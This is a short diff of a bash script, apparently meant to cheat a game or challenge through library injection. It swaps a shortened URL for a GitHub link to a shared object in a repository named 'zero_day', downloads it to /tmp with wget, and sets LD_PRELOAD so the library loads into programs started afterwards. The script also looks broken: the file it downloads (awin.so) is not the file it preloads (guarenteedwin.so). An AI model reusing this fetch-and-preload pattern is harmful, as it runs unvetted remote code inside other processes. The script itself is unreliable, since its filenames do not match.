@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://shorturl.at/brtEU
+wget -P /tmp https://github.com/ThaKookieMansta/zero_day/blob/master/awin.so
 export LD_PRELOAD=/tmp/guarenteedwin.so
